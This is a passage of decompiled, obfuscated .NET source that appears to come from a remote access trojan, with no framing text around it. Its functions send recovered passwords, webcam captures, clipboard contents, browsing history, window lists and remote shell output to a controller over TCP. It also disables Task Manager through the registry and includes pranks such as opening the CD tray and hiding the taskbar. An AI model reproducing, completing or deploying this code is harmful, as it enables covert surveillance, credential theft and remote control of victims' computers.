				text2 += process.WorkingSet64;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string MjUxrGRWk5Ov4bhl2MitM0ZJ118()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ServiceController[] services = ServiceController.GetServices();
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				string text2 = val.get_DisplayName() + "*";
				text2 = text2 + ((Enum)val.get_Status()).ToString() + "*";
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml = new NgfHWSovYOZ2gLml48(val.get_ServiceName());
				text2 += ngfHWSovYOZ2gLml.StartupType;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void ADKSSGPV9NPs3zYZJx6GoVMw119(object Tempdata)
	{
		try
		{
			if (((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().FileExists(Conversions.ToString(Tempdata)))
			{
				((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Tempdata));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object Tempdata)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¼" }, (string[])null, (Type[])null, (bool[])null);
			string text = Conversions.ToString(NewLateBinding.LateGet(array.GetValue(1), (Type)null, "Replace", new object[2] { "±", "\r\n" }, (string[])null, (Type[])null, (bool[])null));
			int num = int.Parse(Conversions.ToString(array.GetValue(0)));
			vHdmoLEFI0xjZISO47 vHdmoLEFI0xjZISO = new vHdmoLEFI0xjZISO47(text);
			vHdmoLEFI0xjZISO.Font = new Font("Tahoma", (float)num);
			((PrintDocument)vHdmoLEFI0xjZISO).Print();
			array = null;
			Tempdata = null;
			num = 0;
			((Component)(object)vHdmoLEFI0xjZISO).Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string OjJfTilERdNKNcl5T28TCa3K121()
	{
		try
		{
			string text = null;
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text2 in array)
			{
				text = text + "*" + text2;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void ssqwzwagQoOhjET2PiWIbjP3122(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private long xgnjGoRDfYMqRP4k2wTpo3Le123(string FileName)
	{
		long length = default(long);
		try
		{
			FileInfo fileInfo = new FileInfo(FileName);
			length = fileInfo.Length;
			return length;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return length;
		}
	}

	private void method_4()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (!IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void dBGFpqEtu89AjyoVpDNtQLba125()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void WrSc2qmHV45DETIcIvO0IZ8Y126()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void N5VeFG9rpvJYxsq3MsFfsKhv127()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void UALkXbsXjUpWu71eUEe9aKFg128()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_5()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void qrkOw7laVvfcWcEpom74OXj5130()
	{
		try
		{
			try
			{
				KVoJFWDFFfKr32.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				streamReader_0.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				H7Dh6pvsTw1D30.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				pk6bwBU7Ll5C29.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_0.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				QjBxDwjq103.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				FPlPaaKX153.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				idgAPcRt68.Close();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_1.Close();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_2.Close();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				fhy5vVmA98.Close();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				D2I3SpwP83.Close();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				xHgHFdV3123.Close();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				UDfXYqnS88.Close();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				aG4opDl5143.Close();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				YRQhjxFi158.Close();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				YRQhjxFi158.Close();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_3.Close();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				V4Ct0Xhc113.Close();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_4.Close();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				cllQpIC5108.Close();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				ma3dtgm8148.Close();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				u4lkk8tJ138.Close();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				YQ35FAZG118.Close();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				DZYDaHEu73.Close();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				H1q3DN2D168 = true;
				pqQVcHfs166 = false;
				UXUEp0AC167 = false;
				huqwYcifJHbK21 = null;
				pIFr3cCEUvmc22 = "Disconnect";
				SendMessageA(gt8AiDYglYK254, 1035, 0, 0);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				HjFVSDhb72.Abort();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_1.Abort();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				o8REKjGB82.Abort();
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_2.Abort();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				EbcvnDre92.Abort();
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				RapN9pjQ97.Abort();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				XjLnT0eQ102.Abort();
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				roBK2yLy107.Abort();
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				msMN456W112.Abort();
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_3.Abort();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				vCaNNJP3122.Abort();
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				iLVRu28A127.Abort();
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_4.Abort();
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				lkBwwrq7137.Abort();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				qoNVJd03142.Abort();
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				lzYCfNl0147.Abort();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				fGfHaKIK152.Abort();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_5.Abort();
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			GC.Collect();
		}
		catch (Exception projectError45)
		{
			ProjectData.SetProjectError(projectError45);
			ProjectData.ClearProjectError();
		}
	}

	private void KVoJFWDFFfKr32_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(e.Data))
			{
				stringBuilder.Append("/CMDCMDGO/");
				stringBuilder.Append(e.Data);
				if (!(e.Data!.StartsWith("Microsoft") | e.Data!.StartsWith("(C)") | e.Data!.StartsWith("Copyright")))
				{
					x4XKr7Pn155.WriteLine((object?)stringBuilder);
					x4XKr7Pn155.Flush();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_6()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, P947dvwG0IVI49, string_0, messageBoxButtons_0, UjhkEvATqjHD47);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string Qq0ENSuRIegPNwfGJmJi2YE6133()
	{
		try
		{
			string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string text = null;
			int num = 1;
			while (true)
			{
				string name2 = "url" + num;
				string text2 = (string)registryKey.GetValue(name2);
				if (text2 == null)
				{
					break;
				}
				text = text + "*" + text2;
				num = checked(num + 1);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
	private static extern void mciSendStringA_1(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void okCZ2yFRMTAxKxBOKUrgGkcy135()
	{
		try
		{
			mciSendStringA_1("set CDAudio door open", tKtX89e665, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void GuxfaRpO9myVhujQRY8AB7vd136()
	{
		try
		{
			mciSendStringA_1("set CDAudio door closed", tKtX89e665, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private int bZ3MOQ6474jy0qGUuLooZFwf137(ref GStruct2 dm)
	{
		return ABoHbCXyZk3bOC0ifuOdbLPq138(ref dm, -1);
	}

	private int ABoHbCXyZk3bOC0ifuOdbLPq138(ref GStruct2 dm, int iModeNum)
	{
		return GClass2.EnumDisplaySettings(null, iModeNum, ref dm);
	}

	private void he5PJ6dvtNbdroSu6KzFmv6R139(GStruct2 dm)
	{
		GClass2.ChangeDisplaySettings(ref dm, 0);
	}

	private void K58vRi4PLYqXw7PS6xH0rNRR140(bool enable)
	{
		try
		{
			if (Conversions.ToDouble(cSe3xqqhKSvv51) < 6.0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object)0, (object)1)), RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void VGyPO6qXegUybDCBUFQi3bUo142(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				dlvB9HmqSWTJRIzo44.SendMessage((IntPtr)desktopWindow, 274u, (IntPtr)61760, (IntPtr)0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Twg4loUFl8uvAeX0O7pHN5Z6143(object swpass)
	{
		try
		{
			GClass0 gClass = new GClass0();
			string text = gClass.Kx0zdz1w31LVeb4q225();
			string text2 = gClass.GWHbTRDi94yhbTJD237();
			string text3 = gClass.method_0();
			string text4 = gClass.U0XItdnCBFAvfTb4229();
			string text5 = gClass.h3eMvGl5P5E45rFB233();
			string text6 = gClass.v4xWJSaF1LLi0ZoI234();
			string text7 = gClass.method_1();
			string text8 = gClass.mUxNYcVtosGgWnwh235();
			string text9 = gClass.LjuC8YzpSyKJV35Q236();
			string text10 = gClass.euxHvMAol8Uprbyk238();
			string text11 = gClass.RUlDnukkvu2R9naZ217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			NewLateBinding.LateCall(swpass, (Type)null, "WriteLine", new object[1] { "/PSWRECOV/" + MbYOg375zXnJrPQtT9UAfZib112(Conversions.ToString(obj), "&%#@?,:*") }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swpass, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool JQyi5FVKM9VhQlBPmed3870F144(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				Process process = processes[num];
				int num2 = default(int);
				if (process.ProcessName.StartsWith(name))
				{
					num2 = checked(num2 + 1);
				}
				if (num2 == 0)
				{
					return false;
				}
				return true;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private int HPuVLdBNxalvPBAFcKJqiGas145(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void vzkzSVXCPTAfb0Yyy8JG060K146()
	{
		try
		{
			l7Sl0IfJ19z719 = ((Computer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Clipboard().GetText();
			l7Sl0IfJ19z719 = l7Sl0IfJ19z719.Replace("\r\n", "***");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DxQnnzm1E1pbS2UBcIFW1ktc147(object Tempdata)
	{
		while (true)
		{
			try
			{
				if (Operators.CompareString(cg3aiWnJJ39C20, "Connect", false) == 0)
				{
					string lpszWindowName = Conversions.ToString(Tempdata);
					gt8AiDYglYK254 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 320, 240, OuCytghriHp218, 0);
					SendMessageA(gt8AiDYglYK254, 1034, 0, 0);
					cg3aiWnJJ39C20 = "";
				}
				else if (Operators.CompareString(huqwYcifJHbK21, "Image", false) == 0 && pqQVcHfs166)
				{
					string_2 = huqwYcifJHbK21;
					huqwYcifJHbK21 = "";
					SendMessageA(gt8AiDYglYK254, 1084, 0, 0);
					SendMessageA(gt8AiDYglYK254, 1054, 0, 0);
					Thread thread = new Thread(MaSaXuspzAVk4zffwzAaAMGw148);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				else if (Operators.CompareString(huqwYcifJHbK21, "Capture", false) == 0 && UXUEp0AC167)
				{
					string_2 = huqwYcifJHbK21;
					SendMessageA(gt8AiDYglYK254, 1084, 0, 0);
					SendMessageA(gt8AiDYglYK254, 1054, 0, 0);
					Thread thread2 = new Thread(MaSaXuspzAVk4zffwzAaAMGw148);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					thread2.Join();
				}
				else if (Operators.CompareString(huqwYcifJHbK21, "Capture2", false) == 0 && UXUEp0AC167)
				{
					string_2 = huqwYcifJHbK21;
					SendMessageA(gt8AiDYglYK254, 1084, 0, 0);
					SendMessageA(gt8AiDYglYK254, 1054, 0, 0);
					Thread thread3 = new Thread(MaSaXuspzAVk4zffwzAaAMGw148);
					thread3.SetApartmentState(ApartmentState.STA);
					thread3.Start();
					thread3.Join();
				}
				else if (Operators.CompareString(pIFr3cCEUvmc22, "Disconnect", false) == 0)
				{
					SendMessageA(gt8AiDYglYK254, 1035, 0, 0);
					pIFr3cCEUvmc22 = "";
					break;
				}
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(50);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void MaSaXuspzAVk4zffwzAaAMGw148()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string text = null;
		checked
		{
			try
			{
				AgwofNQ9MgeC55 = Clipboard.GetDataObject();
				wMQuUxxXxkEj56 = (Image)(Bitmap)AgwofNQ9MgeC55.GetData(DataFormats.Bitmap);
				MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(320, 240, (PixelFormat)135173);
				if (Operators.CompareString(string_2, "Capture", false) == 0)
				{
					wMQuUxxXxkEj56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else if (wMQuUxxXxkEj56.get_Width() > 320)
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.set_InterpolationMode((InterpolationMode)7);
					val2.set_CompositingQuality((CompositingQuality)2);
					val2.DrawImage(wMQuUxxXxkEj56, 0, 0, 320, 240);
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else
				{
					wMQuUxxXxkEj56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				memoryStream.Capacity = (int)memoryStream.Length;
				byte[] buffer = memoryStream.GetBuffer();
				text = Convert.ToBase64String(buffer);
				wMQuUxxXxkEj56.Dispose();
				W9JwSi4FajVE17 = (int)memoryStream.Length;
				memoryStream.Flush();
				memoryStream.Dispose();
				memoryStream.Close();
				buffer = null;
				try
				{
					string text2 = string_2;
					if (Operators.CompareString(text2, "Image", false) == 0)
					{
						mfw1bmIe75.WriteLine("/WEBIMAGE/" + text);
						mfw1bmIe75.Flush();
					}
					else
					{
						mfw1bmIe75.WriteLine("/WEBCAPTR/" + text);
						mfw1bmIe75.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					H1q3DN2D168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				text = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text3 = string_2;
					if (Operators.CompareString(text3, "Image", false) == 0)
					{
						mfw1bmIe75.WriteLine("/WEBIMAGE/" + text);
						mfw1bmIe75.Flush();
					}
					else
					{
						mfw1bmIe75.WriteLine("/WEBCAPTR/" + text);
						mfw1bmIe75.Flush();
					}
					text = null;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					H1q3DN2D168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void d7thq4Jj3EBcHb4ay0Ci7AxD149()
	{
		try
		{
			if (Operators.CompareString(l7Sl0IfJ19z719, (string)null, false) == 0)
			{
				((Computer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Clipboard().Clear();
			}
			else
			{
				((Computer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Clipboard().SetText(l7Sl0IfJ19z719, (TextDataFormat)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tpprJjB0ulXP0bYvQBhqY2yk150()
	{
		try
		{
			Process process = new Process();
			string text = null;
			string text2 = null;
			string text3 = null;
			Process[] processes = Process.GetProcesses(".");
			for (int i = 0; i < processes.Length; i = checked(i + 1))
			{
				process = processes[i];
				if (process.MainWindowTitle.Length > 0)
				{
					text = text + process.MainWindowTitle.ToString() + "²";
					text2 = text2 + process.Id + "³";
					text3 = text + "±" + text2;
				}
			}
			SAGCSeXb145.WriteLine("/REFRWIND/" + text3);
			SAGCSeXb145.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void vqBA9opDAQN0EizK3BIlee9n151()
	{
		List<Rectangle> voaIHaF1mnIit0dB = VoaIHaF1mnIit0dB171;
		Rectangle item = new Rectangle(0, 0, int_5, xDqTOgZD170);
		voaIHaF1mnIit0dB.Add(item);
		List<Rectangle> voaIHaF1mnIit0dB2 = VoaIHaF1mnIit0dB171;
		checked
		{
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0), 0, int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB2.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB3 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 1)), 0, int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB3.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB4 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 2)), 0, int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB4.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB5 = VoaIHaF1mnIit0dB171;
			item = new Rectangle(0, (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB5.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB6 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB6.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB7 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 1)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB7.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB8 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 2)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB8.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB9 = VoaIHaF1mnIit0dB171;
			item = new Rectangle(0, (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 1)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB9.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB10 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 1)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB10.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB11 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 1)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 1)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB11.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB12 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 2)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 1)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB12.Add(item);
